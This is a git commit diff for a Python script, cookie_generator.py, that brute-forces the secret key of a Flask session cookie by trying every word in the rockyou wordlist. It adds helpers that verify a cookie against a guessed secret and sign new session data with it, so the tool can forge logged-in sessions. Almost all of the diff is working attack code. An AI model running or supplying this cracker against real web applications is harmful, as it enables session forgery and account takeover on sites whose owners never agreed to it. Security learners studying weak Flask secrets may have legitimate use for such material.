b7400ea07b4670028cef8f34e16b7118fc19300b
Anthony Acosta M <anthony082008@hotmail.es>
2023-05-10 21:54:25 -0500

    Stable version to find secret (hardcoded wordlist, not asking user input)

--- cookie_generator.py
+++ cookie_generator.py
@@ -1,47 +1,52 @@
 import hashlib
-import datetime
 
-from itsdangerous import URLSafeTimedSerializer, TimestampSigner
+from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature
 from flask.json.tag import TaggedJSONSerializer
-
-DATA_SESSION = {"logged_in":True, "username":"tonyhawk"}
 
 # TODO: Add this to ask for user input
 # Read cookie.example and set the contents to a variable 
-with open('cookie.example', 'r') as f:
-    COOKIE_EXAMPLE = f.read().strip()
+with open('cookie', 'r') as f:
+    COOKIE = f.read().strip()
 
 # TODO: Ask for wordlist in user input
 def crack_cookie():
     with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
         wordlist = f.read().splitlines()
     for word in wordlist:
-        encoded_cookie = encode(word, DATA_SESSION)
-        if encoded_cookie == COOKIE_EXAMPLE:
+        if verify(word, COOKIE):
             print(f'Found secret: {word}')
             break
 
+def verify(secret: str, cookie: str) -> bool:
+    """
+    Verify a cookie
+    :param secret: Secret key
+    :param cookie: Cookie to verify
+    :return: True if cookie is valid, False otherwise
+    """
+    try:
+        get_serializer(secret).loads(cookie)
+    except BadSignature:
+        return False
+    return True
 
-# THIS IS JUST FOR TESTING PURPOSES
-# TODO: Remove this function
-class DefaultTimestampSigner(TimestampSigner):
-    def get_timestamp(self) -> int:
-        # Parse the string into a datetime object
-        dt = datetime.datetime.strptime('Wed, 10 May 2023 04:39:05', '%a, %d %b %Y %H:%M:%S')
-        
-        # Convert the datetime object to a Unix timestamp
-        timestamp = dt.timestamp()
-        return int(timestamp)
+def sign(data: dict, secret: str) -> str:
+    """
+    Sign a cookie
+    :param data: Data to sign
+    :param secret: Secret key
+    :return: Signed cookie
+    """
+    return get_serializer(secret).dumps(data)
     
-def encode(secret: str, data: dict) -> str:
+def get_serializer(secret: str) -> URLSafeTimedSerializer:
     """
     Encode a Flask session cookie
     :param secret: Secret key
     :param data: Data to encode
     :return: Encoded cookie
     """
-
-    signer = DefaultTimestampSigner
+    signer = TimestampSigner
 
     return URLSafeTimedSerializer(
         secret_key=secret,
@@ -50,10 +55,7 @@ def encode(secret: str, data: dict) -> str:
         signer=signer,
         signer_kwargs={
             'key_derivation': 'hmac',
-            'digest_method': hashlib.sha1}).dumps(data)
+            'digest_method': hashlib.sha1})
 
 if __name__ == '__main__':
-    # test_hash = encode('secretTEST', DATA_SESSION)
-    # print(test_hash)
-
     crack_cookie()
